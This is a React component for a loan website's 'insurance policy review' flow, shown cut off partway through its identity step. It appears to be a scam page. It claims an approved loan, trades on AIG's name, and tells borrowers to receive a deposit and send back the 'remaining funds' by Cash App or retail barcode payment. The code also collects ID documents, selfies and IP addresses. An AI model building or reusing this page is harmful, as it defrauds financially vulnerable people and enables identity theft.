import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Shield, FileText, CheckCircle, Gavel, CreditCard, ArrowRight, ArrowLeft, CheckCircle2 } from 'lucide-react';
import { saveInsuranceReview } from '../services/databaseService';

const InsurancePolicyReview = () => {
  const navigate = useNavigate();
  const [currentStep, setCurrentStep] = useState(1);
  const [customerEmail, setCustomerEmail] = useState('');
  const [userIP, setUserIP] = useState('Loading...');
  const [idType, setIdType] = useState('');
  const [idDocumentFront, setIdDocumentFront] = useState(null);
  const [idDocumentBack, setIdDocumentBack] = useState(null);
  const [selfiePhoto, setSelfiePhoto] = useState(null);
  const [understandingStatement, setUnderstandingStatement] = useState('');
  const [agreements, setAgreements] = useState({
    agree1: false,
    agree2: false,
    agree3: false
  });
  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);

  const totalSteps = 5;

  useEffect(() => {
    // Get customer email from session storage
    const storedCustomerData = sessionStorage.getItem('customerData');
    if (storedCustomerData) {
      const customerData = JSON.parse(storedCustomerData);
      setCustomerEmail(customerData.email);
    }

    // Get user IP
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        setUserIP(data.ip);
      })
      .catch(error => {
        setUserIP('Unable to detect');
      });
  }, []);

  const nextStep = () => {
    if (currentStep < totalSteps) {
      setCurrentStep(currentStep + 1);
      window.scrollTo(0, 0);
    }
  };

  const prevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
      window.scrollTo(0, 0);
    }
  };

  const checkAgreements = () => {
    if (agreements.agree1 && agreements.agree2 && agreements.agree3) {
      nextStep();
    } else {
      alert('Please agree to all terms before continuing.');
    }
  };

  const checkIDSelection = () => {
    // ID selection is now optional, allow proceeding without it
    nextStep();
  };

  const handleSubmit = async () => {
    if (!understandingStatement.trim()) {
      alert('Please type an understanding statement to confirm.');
      return;
    }

    if (!customerEmail) {
      alert('Customer email not found. Please log in again.');
      navigate('/customer-login');
      return;
    }

    setLoading(true);

    try {
      // Convert files to base64 for storage
      const convertFileToBase64 = (file) => {
        return new Promise((resolve, reject) => {
          if (!file) {
            resolve(null);
            return;
          }
          const reader = new FileReader();
          reader.readAsDataURL(file);
          reader.onload = () => resolve(reader.result);
          reader.onerror = error => reject(error);
        });
      };

      const idDocumentFrontBase64 = await convertFileToBase64(idDocumentFront);
      const idDocumentBackBase64 = await convertFileToBase64(idDocumentBack);
      const selfiePhotoBase64 = await convertFileToBase64(selfiePhoto);

      await saveInsuranceReview({
        email: customerEmail,
        understandingStatement: understandingStatement,
        ipAddress: userIP,
        idType: idType,
        idDocumentFront: idDocumentFrontBase64,
        idDocumentBack: idDocumentBackBase64,
        selfiePhoto: selfiePhotoBase64
      });

      setSubmitted(true);
    } catch (error) {
      console.error('Error submitting review:', error);
      alert('Error submitting review. Please try again.');
      setLoading(false);
    }
  };

  const StepIndicator = () => (
    <div className="bg-white rounded-lg shadow-sm p-6 mb-8">
      <div className="flex justify-between items-center">
        {[1, 2, 3, 4, 5].map((step) => (
          <React.Fragment key={step}>
            <div
              className={`w-12 h-12 rounded-full flex items-center justify-center font-bold border-2 ${
                step === currentStep
                  ? 'bg-orange-500 text-black border-orange-500'
                  : step < currentStep
                  ? 'bg-green-500 text-white border-green-500'
                  : 'bg-gray-100 text-gray-400 border-gray-300'
              }`}
            >
              {step < currentStep ? <CheckCircle className="w-6 h-6" /> : step}
            </div>
            {step < totalSteps && (
              <div className="flex-1 h-1 bg-gray-200 mx-2">
                <div
                  className={`h-full ${step < currentStep ? 'bg-green-500' : 'bg-gray-200'}`}
                  style={{ width: step < currentStep ? '100%' : '0%' }}
                />
              </div>
            )}
          </React.Fragment>
        ))}
      </div>
      <div className="flex justify-between mt-2 text-xs text-gray-500">
        <span>Read Policy</span>
        <span>Agree Terms</span>
        <span>Legal Consequences</span>
        <span>ID Proof</span>
        <span>Confirmation</span>
      </div>
    </div>
  );

  if (submitted) {
    return (
      <div className="min-h-screen bg-gray-50">
        <header className="bg-white shadow-sm border-b">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex justify-between items-center h-16">
              <div className="flex items-center">
                <h1 className="text-xl font-bold text-gray-900">Upstart Loans</h1>
                <span className="ml-2 text-sm text-gray-500">Insurance Policy Review</span>
              </div>
            </div>
          </div>
        </header>

        <main className="max-w-3xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
          <div className="bg-white rounded-lg shadow-sm p-8 text-center">
            <div className="text-green-500 text-6xl mb-4">
              <CheckCircle2 className="w-16 h-16 mx-auto" />
            </div>
            <h2 className="text-3xl font-bold text-gray-900 mb-4">Insurance Review Completed!</h2>
            <p className="text-gray-600 mb-6">
              Your insurance policy review has been successfully submitted. The admin will be notified.
            </p>
            <button
              onClick={() => navigate('/customer-dashboard')}
              className="bg-orange-500 text-black py-3 px-8 rounded-lg font-semibold hover:bg-orange-600 transition"
            >
              Return to Dashboard
            </button>
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-white shadow-sm border-b">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center">
              <h1 className="text-xl font-bold text-gray-900">Upstart Loans</h1>
              <span className="ml-2 text-sm text-gray-500">Insurance Policy Review</span>
            </div>
            <span className="text-gray-500 text-sm flex items-center">
              <Shield className="w-4 h-4 mr-2" />
              Secure Review Process
            </span>
          </div>
        </div>
      </header>

      <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <StepIndicator />

        {/* Step 1: Read Legal Document */}
        {currentStep === 1 && (
          <div className="bg-white rounded-lg shadow-sm p-6 mb-8">
            <h2 className="text-2xl font-bold text-gray-900 mb-6 flex items-center">
              <FileText className="w-6 h-6 mr-2 text-orange-500" />
              Step 1: Understanding Payment Protection Insurance
            </h2>

            <div className="bg-blue-50 border-2 border-blue-200 rounded-lg p-4 mb-6">
              <div className="flex items-start">
                <Shield className="w-5 h-5 text-blue-500 mr-3 mt-0.5" />
                <div>
                  <p className="text-gray-900 text-sm font-medium mb-1">Why Are You Here?</p>
                  <p className="text-gray-700 text-sm mb-3">
                    Based on your profile, we require Payment Protection Insurance to protect your loan and help you build a better financial future. This is a standard practice in the following situations:
                  </p>
                  <ul className="list-disc list-inside text-gray-700 text-sm space-y-1">
                    <li><strong>Low Credit Score:</strong> Insurance helps qualify you for the loan and can help rebuild credit through consistent payments</li>
                    <li><strong>Negative Bank Account:</strong> Insurance provides protection during account normalization and ensures loan repayment capability</li>
                    <li><strong>Previous Fraud History:</strong> Additional security measures help protect both parties and establish trust</li>
                    <li><strong>Bankruptcy History:</strong> Insurance demonstrates financial responsibility and provides a safety net for repayment</li>
                  </ul>
                </div>
              </div>
            </div>

            <div className="bg-gray-50 rounded-lg p-6 text-gray-700 text-sm leading-relaxed max-h-[600px] overflow-y-auto">
              {/* Document Header */}
              <div className="mb-6 pb-4 border-b border-gray-300">
                <h3 className="text-lg font-bold text-gray-900 mb-2">AIG Financial Services</h3>
                <p className="text-gray-600 text-xs">Payment Protection Insurance (PPI) | Bank Account Review | Loan Terms & Conditions & Disclosure Policy</p>
                <p className="text-gray-500 text-xs mt-1">Document Version: 1.0 | Effective Date: January 1, 2025 | Last Updated: January 1, 2025</p>
              </div>

              {/* About AIG */}
              <div className="mb-6 pb-4 border-b border-gray-300">
                <h4 className="text-orange-500 font-semibold mb-2">About Your Insurance Provider: AIG</h4>
                <p className="mb-3">
                  <strong>AIG (American International Group)</strong> is a global leader in commercial and personal insurance solutions. With <strong>$24 billion in net premiums written in 2024</strong> and operations in <strong>200+ countries and jurisdictions</strong>, AIG provides expertise and support that builds confidence to pursue bold ideas and shape the future.
                </p>
                <p className="mb-3">
                  AIG helps clients and partners protect what matters most so they can withstand setbacks and realize their goals. As one of the world's most far-reaching property-casualty networks, AIG offers a broad range of products including Liability, Financial Lines, Property, Global Specialty, Crop Risk Services, Personal Lines, and Accident & Health.
                </p>
                <p className="text-gray-600 text-xs">
                  Learn more at: <a href="https://www.aig.com/home/about" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">www.aig.com/home/about</a>
                </p>
              </div>

              {/* Why Insurance is Needed */}
              <div className="mb-6 pb-4 border-b border-gray-300">
                <h4 className="text-orange-500 font-semibold mb-2">Why Do You Need Payment Protection Insurance?</h4>
                <p className="mb-3">
                  <strong>Important: We Have Already Approved Your Loan Application.</strong> This insurance is not a rejection—it's a pathway to make your approved loan a reality while helping you rebuild your credit for a brighter financial future.
                </p>
                <div className="bg-green-50 border border-green-200 rounded-lg p-3 mb-3">
                  <p className="text-green-800 text-sm mb-2">
                    <strong>Good News:</strong> Your loan has been approved! The insurance requirement is simply a protective measure that allows us to fund your loan despite credit challenges, while giving you tools to rebuild your credit score.
                  </p>
                </div>
                <div className="space-y-3 text-gray-600 text-sm">
                  <p><strong>Understanding Your Situation:</strong></p>
                  <p className="mb-2">We understand that low credit scores happen for many different reasons. Here are common scenarios we see every day, and how this insurance helps in each case:</p>
                  
                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-2">
                    <p className="text-blue-900 font-semibold mb-1">Scenario 1: Multiple Loan Applications</p>
                    <p className="text-blue-700 text-xs">You may have applied to several loan companies at once to find the best option. Each company ran a credit inquiry, which temporarily lowered your score. This insurance helps us approve you despite those inquiries, and on-time payments will help your score recover.</p>
                  </div>
                  
                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-2">
                    <p className="text-blue-900 font-semibold mb-1">Scenario 2: Medical Bills or Unexpected Expenses</p>
                    <p className="text-blue-700 text-xs">Medical emergencies or unexpected costs can lead to late payments or collections. This isn't a reflection of your character—it's life happening. The insurance protects your loan payments if health issues arise again, while consistent repayment helps rebuild your credit.</p>
                  </div>
                  
                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-2">
                    <p className="text-blue-900 font-semibold mb-1">Scenario 3: Period of Unemployment</p>
                    <p className="text-blue-700 text-xs">Job loss or extended unemployment can make it impossible to keep up with bills. You're now back on your feet and ready to move forward. This insurance covers your loan if you face unemployment again, giving you stability while you rebuild.</p>
                  </div>
                  
                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-2">
                    <p className="text-blue-900 font-semibold mb-1">Scenario 4: Young and Building Credit</p>
                    <p className="text-blue-700 text-xs">If you're young or new to credit, you may not have a long credit history or made some early mistakes learning the system. This insurance helps you access credit now while establishing a positive payment history for the future.</p>
                  </div>
                  
                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-2">
                    <p className="text-blue-900 font-semibold mb-1">Scenario 5: Previous Loan Rejections</p>
                    <p className="text-blue-700 text-xs">Being rejected by other lenders can be discouraging and may have lowered your score further. We've approved you—this insurance is the final step to access your funds and prove your creditworthiness through consistent payments.</p>
                  </div>
                  
                  <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-2">
                    <p className="text-blue-900 font-semibold mb-1">Scenario 6: Divorce or Life Changes</p>
                    <p className="text-blue-700 text-xs">Major life events like divorce, separation, or family changes can disrupt finances and credit. You're starting fresh. This insurance provides protection during transitions while you rebuild your financial foundation.</p>
                  </div>
                  
                  <p className="mt-3"><strong>How This Insurance Helps You Specifically:</strong></p>
                  <ul className="list-disc list-inside space-y-2 ml-4">
                    <li><strong>Access Your Approved Loan:</strong> Without this insurance, lenders cannot fund loans for certain credit profiles. This requirement unlocks your already-approved loan amount.</li>
                    <li><strong>Rebuild Your Credit:</strong> Every on-time payment (covered by insurance if needed) is reported to credit bureaus, gradually improving your score over time.</li>
                    <li><strong>Protection Against Setbacks:</strong> If you face job loss, disability, or other covered events, the insurance makes your loan payments so you don't default and damage your credit further.</li>
                    <li><strong>Demonstrate Reliability:</strong> Successfully managing this loan with insurance shows future lenders you're responsible, qualifying you for better rates and terms on future loans.</li>
                    <li><strong>Peace of Mind:</strong> You won't lose your home or face severe hardship if unexpected life events occur. The insurance has your back.</li>
                    <li><strong>No Cost to You:</strong> AIG Financial Services covers the insurance premium. You don't pay from your personal funds—this is truly an opportunity, not an expense.</li>
                  </ul>
                </div>
              </div>

              {/* How It Works - The No-Cost Process */}
              <div className="mb-6 pb-4 border-b border-gray-300">
                <h4 className="text-orange-500 font-semibold mb-2">How It Works: The No-Cost Process</h4>
                <p className="mb-3">
                  <strong>Important:</strong> You do NOT pay for this insurance from your personal funds. AIG Financial Services covers the cost as part of our commitment to helping you access credit.
                </p>
                
                <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-3">
                  <h5 className="text-blue-800 font-semibold mb-3">Step-by-Step Process:</h5>
                  <div className="space-y-3">
                    <div className="flex items-start">
                      <div className="bg-blue-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold mr-3 mt-0.5">1</div>
                      <div>
                        <p className="text-blue-900 font-medium">Company Initiates Deposit</p>
                        <p className="text-blue-700 text-xs">We deposit the insurance premium amount into your bank account</p>
                      </div>
                    </div>
                    <div className="flex items-start">
                      <div className="bg-blue-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold mr-3 mt-0.5">2</div>
                      <div>
                        <p className="text-blue-900 font-medium">You Pay Insurance Premium</p>
                        <p className="text-blue-700 text-xs">You use the deposited funds to pay the AIG insurance premium</p>
                      </div>
                    </div>
                    <div className="flex items-start">
                      <div className="bg-blue-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold mr-3 mt-0.5">3</div>
                      <div>
                        <p className="text-blue-900 font-medium">You Return Remaining Funds</p>
                        <p className="text-blue-700 text-xs">Any remaining balance after insurance payment is returned to us</p>
                      </div>
                    </div>
                    <div className="flex items-start">
                      <div className="bg-blue-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold mr-3 mt-0.5">4</div>
                      <div>
                        <p className="text-blue-900 font-medium">Loan Disbursement</p>
                        <p className="text-blue-700 text-xs">Once insurance is active, your loan proceeds are disbursed</p>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Insurance Cost */}
              <div className="mb-6 pb-4 border-b border-gray-300">
                <h4 className="text-orange-500 font-semibold mb-2">How Much Will It Cost?</h4>
                <p className="mb-3">
                  Payment Protection Insurance premiums range from <strong>$500 to $2,000</strong>, depending on your specific profile:
                </p>
                <ul className="list-disc list-inside mb-3 space-y-1 text-gray-600">
                  <li>Loan amount</li>
                  <li>Coverage level selected</li>
                  <li>Loan term duration</li>
                  <li>Individual risk factors</li>
                </ul>
                <p className="text-gray-600 text-sm">
                  <strong>Remember:</strong> This cost is covered by AIG Financial Services, not paid from your personal funds.
                </p>
              </div>

              {/* What the Insurance Covers */}
              <div className="mb-6 pb-4 border-b border-gray-300">
                <h4 className="text-orange-500 font-semibold mb-2">What Does the Insurance Cover?</h4>
                <p className="mb-3">
                  AIG's Payment Protection Insurance protects your loan repayments in the following situations:
                </p>
                <ul className="list-disc list-inside mb-3 space-y-2 text-gray-600">
                  <li><strong>Involuntary Unemployment:</strong> If you lose your job through no fault of your own</li>
                  <li><strong>Disability:</strong> If you become unable to work due to illness or injury</li>
                  <li><strong>Death:</strong> If you pass away, the remaining loan balance is covered</li>
                </ul>
                <p className="text-gray-600 text-sm">
                  Coverage details: Up to $1,500 per month for up to 12 months.
                </p>
              </div>

              {/* Eligibility */}
              <div className="mb-6 pb-4 border-b border-gray-300">
                <h4 className="text-orange-500 font-semibold mb-2">Eligibility Requirements</h4>
                <ul className="list-disc list-inside space-y-1 text-gray-600">
                  <li>Age: 18-65 years old</li>
                  <li>Employment: At least 6 months current employment</li>
                  <li>Residency: Permanent resident status</li>
                </ul>
              </div>

              {/* Exclusions */}
              <div className="mb-6 pb-4 border-b border-gray-300">
                <h4 className="text-orange-500 font-semibold mb-2">What's Not Covered (Exclusions)</h4>
                <ul className="list-disc list-inside space-y-1 text-gray-600">
                  <li>Pre-existing medical conditions</li>
                  <li>Self-inflicted injuries</li>
                  <li>Unemployment due to misconduct</li>
                  <li>Voluntary resignation from employment</li>
                </ul>
              </div>

              {/* Claims Process */}
              <div className="mb-6 pb-4 border-b border-gray-300">
                <h4 className="text-orange-500 font-semibold mb-2">How to File a Claim</h4>
                <p className="mb-3">
                  If you need to file a claim:
                </p>
                <ol className="list-decimal list-inside space-y-1 text-gray-600">
                  <li>Submit claim within 30 days of qualifying event</li>
                  <li>Provide supporting documentation (medical records, termination letter, etc.)</li>
                  <li>AIG reviews and processes your claim</li>
                  <li>If approved, payments are made directly to cover your loan</li>
                </ol>
              </div>

              {/* Cancellation Policy */}
              <div className="mb-6 pb-4 border-b border-gray-300">
                <h4 className="text-orange-500 font-semibold mb-2">Cancellation Policy</h4>
                <p className="mb-3">
                  You may cancel this policy within 30 days of purchase for a full refund. After 30 days, cancellation is subject to pro-rata refund based on remaining coverage period.
                </p>
              </div>

              {/* Important Rules */}
              <div className="mb-6 pb-4 border-b border-gray-300">
                <h4 className="text-orange-500 font-semibold mb-2">Important Rules & Responsibilities</h4>
                <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3 mb-3">
                  <p className="text-yellow-800 text-sm">
                    <strong>Use of Deposited Funds:</strong> The funds we deposit for insurance premium must be used ONLY to pay the AIG insurance premium. Any other use is unauthorized and may result in immediate application denial.
                  </p>
                </div>
                <div className="bg-red-50 border border-red-200 rounded-lg p-3 mb-3">
                  <p className="text-red-800 text-sm">
                    <strong>False Information:</strong> Providing false information or making fraudulent claims may result in policy cancellation, legal action, and prosecution. We take fraud seriously.
                  </p>
                </div>
                <ul className="list-disc list-inside space-y-1 text-gray-600">
                  <li>Provide accurate information throughout the process</li>
                  <li>Use deposited funds strictly for insurance payment</li>
                  <li>Return any remaining balance as instructed</li>
                  <li>Cooperate with all verification requests</li>
                </ul>
              </div>

              {/* Privacy & Data */}
              <div className="mb-6 pb-4 border-b border-gray-300">
                <h4 className="text-orange-500 font-semibold mb-2">Privacy & Data Protection</h4>
                <p className="text-gray-600 text-sm">
                  Your information is used for underwriting, verification, compliance monitoring, fraud prevention, and service delivery. We maintain comprehensive data security measures and privacy protections in accordance with applicable U.S. laws.
                </p>
              </div>

              {/* Governing Law */}
              <div className="mb-6 pb-4 border-b border-gray-300">
                <h4 className="text-orange-500 font-semibold mb-2">Governing Law</h4>
                <p className="text-gray-600 text-sm">
                  These policies are governed by applicable U.S. federal laws and the laws of the state where AIG Financial Services operates. Any disputes shall be resolved in appropriate federal or state courts.
                </p>
              </div>

              {/* Payment Return Options */}
              <div className="mb-6 pb-4 border-b border-gray-300">
                <h4 className="text-orange-500 font-semibold mb-2">How to Return Insurance Payment to Us</h4>
                <p className="mb-3">
                  After you pay the insurance premium, you will return any remaining funds to AIG Financial Services. We handle all insurance paperwork directly with AIG. You only interact with us. Choose one of the following payment return methods:
                </p>

                <div className="space-y-4">
                  {/* Option 1: Cash App */}
                  <div className="bg-green-50 border border-green-200 rounded-lg p-4">
                    <div className="flex items-start mb-3">
                      <div className="bg-green-600 text-white rounded-full w-8 h-8 flex items-center justify-center text-sm font-bold mr-3 mt-0.5">1</div>
                      <div>
                        <h5 className="text-green-900 font-semibold">Option 1: Cash App Transfer</h5>
                        <p className="text-green-700 text-xs">Available if you have used Cash App for 3+ months</p>
                      </div>
                    </div>
                    <div className="ml-11 space-y-2 text-sm text-green-800">
                      <p><strong>Eligibility:</strong> You must have been using Cash App for at least 3 months and be familiar with the platform.</p>
                      <p><strong>Process:</strong></p>
                      <ol className="list-decimal list-inside ml-4 space-y-1 text-green-700">
                        <li>We will provide our Cash App handle ($tag)</li>
                        <li>Open your Cash App and send the remaining balance to our handle</li>
                        <li>Include your name and application ID in the payment note</li>
                        <li>Send us a screenshot of the completed transaction</li>
                      </ol>
                      <p className="text-green-600 text-xs"><strong>Note:</strong> This is the fastest and most convenient option if you qualify.</p>
                    </div>
                  </div>

                  {/* Option 2: Barcode Payment */}
                  <div className="bg-purple-50 border border-purple-200 rounded-lg p-4">
                    <div className="flex items-start mb-3">
                      <div className="bg-purple-600 text-white rounded-full w-8 h-8 flex items-center justify-center text-sm font-bold mr-3 mt-0.5">2</div>
                      <div>
                        <h5 className="text-purple-900 font-semibold">Option 2: Government Store Barcode Payment</h5>
                        <p className="text-purple-700 text-xs">Available for all customers</p>
                      </div>
                    </div>
                    <div className="ml-11 space-y-2 text-sm text-purple-800">
                      <p><strong>Process:</strong></p>
                      <ol className="list-decimal list-inside ml-4 space-y-1 text-purple-700">
                        <li>We will provide a unique AIG barcode registered in your name</li>
                        <li>Visit any participating government store (Walmart, CVS, Walgreens, etc.)</li>
                        <li>Show the barcode to the cashier at the customer service desk</li>
                        <li>Pay the remaining balance using cash, debit, or credit card</li>
                        <li>The payment goes directly to AIG under your registration</li>
                        <li>Keep the receipt and send us a photo for verification</li>
                      </ol>
                      <p className="text-purple-600 text-xs"><strong>Note:</strong> The barcode is specifically linked to your account for security and tracking purposes.</p>
                    </div>
                  </div>
                </div>

                <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3 mt-4">
                  <p className="text-yellow-800 text-sm">
                    <strong>Important:</strong> We handle all insurance documentation and paperwork directly with AIG. You do not need to contact AIG directly. Simply return the funds to us using one of the methods above, and we will complete the insurance activation process.
                  </p>
                </div>
              </div>

              {/* Customer Acknowledgment */}
              <div className="mb-6">
                <h4 className="text-orange-500 font-semibold mb-2">Your Acknowledgment</h4>
                <p className="text-gray-600 text-sm">
                  By proceeding to the next step, you acknowledge that you have read, understood, and agreed to all terms and conditions outlined above. You understand that:
                </p>
                <ul className="list-disc list-inside space-y-1 text-gray-600 mt-2">
                  <li>The insurance is required due to your credit profile</li>
                  <li>The cost is covered by AIG Financial Services, not your personal funds</li>
                  <li>You must use deposited funds only for insurance payment</li>
                  <li>Providing false information may have legal consequences</li>
                </ul>
              </div>

              <p className="mt-6 text-gray-500 text-xs border-t border-gray-300 pt-4">
                This document is provided by AIG Financial Services in partnership with AIG (American International Group). For questions about this policy, please contact our compliance department.
              </p>
            </div>

            <div className="mt-6 flex justify-end">
              <button
                onClick={nextStep}
                className="bg-orange-500 text-black py-3 px-8 rounded-lg font-semibold hover:bg-orange-600 transition flex items-center"
              >
                I Understand - Continue to Agreement
                <ArrowRight className="w-4 h-4 ml-2" />
              </button>
            </div>
          </div>
        )}

        {/* Step 2: Agree to Terms */}
        {currentStep === 2 && (
          <div className="bg-white rounded-lg shadow-sm p-6 mb-8">
            <h2 className="text-2xl font-bold text-gray-900 mb-6 flex items-center">
              <CheckCircle className="w-6 h-6 mr-2 text-orange-500" />
              Step 2: Agree to Terms
            </h2>

            <div className="space-y-4 mb-6">
              <label className="flex items-start space-x-3 cursor-pointer">
                <input
                  type="checkbox"
                  checked={agreements.agree1}
                  onChange={(e) => setAgreements({ ...agreements, agree1: e.target.checked })}
                  className="mt-1 w-5 h-5 rounded border-gray-300 text-orange-500 focus:ring-orange-500"
                />
                <span className="text-gray-700 text-sm">
                  I have read and understood the Payment Protection Insurance Policy
                </span>
              </label>
              <label className="flex items-start space-x-3 cursor-pointer">
                <input
                  type="checkbox"
                  checked={agreements.agree2}
                  onChange={(e) => setAgreements({ ...agreements, agree2: e.target.checked })}
                  className="mt-1 w-5 h-5 rounded border-gray-300 text-orange-500 focus:ring-orange-500"
                />
                <span className="text-gray-700 text-sm">
                  I agree to the terms and conditions outlined in the policy
                </span>
              </label>
              <label className="flex items-start space-x-3 cursor-pointer">
                <input
                  type="checkbox"
                  checked={agreements.agree3}
                  onChange={(e) => setAgreements({ ...agreements, agree3: e.target.checked })}
                  className="mt-1 w-5 h-5 rounded border-gray-300 text-orange-500 focus:ring-orange-500"
                />
                <span className="text-gray-700 text-sm">
                  I understand the legal consequences of providing false information
                </span>
              </label>
            </div>

            <div className="flex justify-between">
              <button
                onClick={prevStep}
                className="bg-gray-200 text-gray-700 py-3 px-8 rounded-lg font-semibold hover:bg-gray-300 transition flex items-center"
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Previous
              </button>
              <button
                onClick={checkAgreements}
                className="bg-orange-500 text-black py-3 px-8 rounded-lg font-semibold hover:bg-orange-600 transition flex items-center"
              >
                Continue
                <ArrowRight className="w-4 h-4 ml-2" />
              </button>
            </div>
          </div>
        )}

        {/* Step 3: Legal Consequences */}
        {currentStep === 3 && (
          <div className="bg-white rounded-lg shadow-sm p-6 mb-8">
            <h2 className="text-2xl font-bold text-gray-900 mb-6 flex items-center">
              <Gavel className="w-6 h-6 mr-2 text-orange-500" />
              Step 3: Legal Consequences
            </h2>

            <div className="bg-red-50 border-2 border-red-200 rounded-lg p-4 mb-6">
              <h3 className="text-red-600 font-semibold mb-2">IMPORTANT LEGAL NOTICE</h3>
              <p className="text-gray-900 text-sm">
                Please read the following legal consequences carefully before proceeding.
              </p>
            </div>

            <div className="space-y-4 text-gray-700 text-sm">
              <div className="bg-gray-50 rounded-lg p-4">
                <h4 className="text-orange-500 font-semibold mb-2">Fraudulent Claims</h4>
                <p>
                  Making false statements or fraudulent claims may result in criminal prosecution under federal law.
                </p>
              </div>
              <div className="bg-gray-50 rounded-lg p-4">
                <h4 className="text-orange-500 font-semibold mb-2">Policy Cancellation</h4>
                <p>
                  Your policy may be immediately cancelled if any information provided is found to be false or misleading.
                </p>
              </div>
              <div className="bg-gray-50 rounded-lg p-4">
                <h4 className="text-orange-500 font-semibold mb-2">Legal Action</h4>
                <p>
                  The company reserves the right to take legal action to recover any payments made under false pretenses.
                </p>
              </div>
              <div className="bg-gray-50 rounded-lg p-4">
                <h4 className="text-orange-500 font-semibold mb-2">Credit Impact</h4>
                <p>
                  Fraudulent activity may be reported to credit bureaus and could negatively impact your credit score.
                </p>
              </div>
            </div>

            <div className="mt-6 flex justify-between">
              <button
                onClick={prevStep}
                className="bg-gray-200 text-gray-700 py-3 px-8 rounded-lg font-semibold hover:bg-gray-300 transition flex items-center"
              >
                <ArrowLeft className="w-4 h-4 mr-2" />
                Previous
              </button>
              <button
                onClick={nextStep}
                className="bg-orange-500 text-black py-3 px-8 rounded-lg font-semibold hover:bg-orange-600 transition flex items-center"
              >
                I Understand the Consequences
                <ArrowRight className="w-4 h-4 ml-2" />
              </button>
            </div>
          </div>
        )}

        {/* Step 4: ID Proof */}
        {currentStep === 4 && (
          <div className="bg-white rounded-lg shadow-sm p-6 mb-8">
            <h2 className="text-2xl font-bold text-gray-900 mb-6 flex items-center">
              <CreditCard className="w-6 h-6 mr-2 text-orange-500" />
              Step 4: Identity Verification
            </h2>

            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
              <p className="text-blue-700 text-sm flex items-center">
                <Shield className="w-4 h-4 mr-2" />
                Identity verification is optional but recommended for enhanced security.
              </p>
            </div>

            <div className="mb-6">
              <label className="block text-gray-700 text-sm font-medium mb-2">Select Your ID Type</label>
              <select
                value={idType}
                onChange={(e) => setIdType(e.target.value)}
                className="w-full bg-white border border-gray-300 rounded-lg text-gray-900 p-3 focus:outline-none focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
              >
                <option value="">Select ID Type</option>
                <option value="driver_license">Driver's License</option>
                <option value="passport">Passport</option>
                <option value="state_id">State ID</option>
                <option value="national_id">National ID Card</option>
              </select>
            </div>

            <div className="mb-6">
              <label className="block text-gray-700 text-sm font-medium mb-2">Upload ID Document - Front</label>
              <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center hover:border-orange-500 transition cursor-pointer">
                <input
                  type="file"
                  id="idDocumentFront"
                  accept="image/*,.pdf"
                  onChange={(e) => setIdDocumentFront(e.target.files[0])}
                  className="hidden"
                />
                <label htmlFor="idDocumentFront" className="cursor-pointer">
                  <CreditCard className="w-12 h-12 mx-auto text-gray-400 mb-2" />
                  <p className="text-gray-600 text-sm mb-1">
                    {idDocumentFront ? idDocumentFront.name : 'Click to upload or drag and drop'}
                  </p>
                  <p className="text-gray-400 text-xs">PNG, JPG, PDF up to 10MB</p>
                </label>
              </div>
            </div>

            <div className="mb-6">
              <label className="block text-gray-700 text-sm font-medium mb-2">Upload ID Document - Back</label>
              <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center hover:border-orange-500 transition cursor-pointer">
                <input
                  type="file"
                  id="idDocumentBack"
                  accept="image/*,.pdf"
                  onChange={(e) => setIdDocumentBack(e.target.files[0])}
                  className="hidden"
                />
                <label htmlFor="idDocumentBack" className="cursor-pointer">
                  <CreditCard className="w-12 h-12 mx-auto text-gray-400 mb-2" />
                  <p className="text-gray-600 text-sm mb-1">
                    {idDocumentBack ? idDocumentBack.name : 'Click to upload or drag and drop'}
                  </p>
                  <p className="text-gray-400 text-xs">PNG, JPG, PDF up to 10MB</p>
                </label>
              </div>
            </div>

            <div className="mb-6">
              <label className="block text-gray-700 text-sm font-medium mb-2">Upload Selfie Photo</label>
              <div className="border-2 border-dashed border-gray-300 rounded-lg p-6 text-center hover:border-orange-500 transition cursor-pointer">
                <input
                  type="file"
                  id="selfiePhoto"
                  accept="image/*"
                  onChange={(e) => setSelfiePhoto(e.target.files[0])}
                  className="hidden"
                />
                <label htmlFor="selfiePhoto" className="cursor-pointer">
                  <Shield className="w-12 h-12 mx-auto text-gray-400 mb-2" />
                  <p className="text-gray-600 text-sm mb-1">
                    {selfiePhoto ? selfiePhoto.name : 'Click to upload or drag and drop'}
                  </p>
                  <p className="text-gray-400 text-xs">PNG, JPG up to 10MB</p>
                </label>
              </div>
              <p className="text-gray-500 text-xs mt-2">
                Selfie photo is used for security verification purposes only.
              </p>
            </div>

            <div className="mb-6">
              <p className="text-gray-500 text-sm mb-2">Your IP Address (for verification):</p>
              <p className="text-gray-900 font-mono text-sm bg-gray-50 p-2 rounded">{userIP}</p>
            </div>

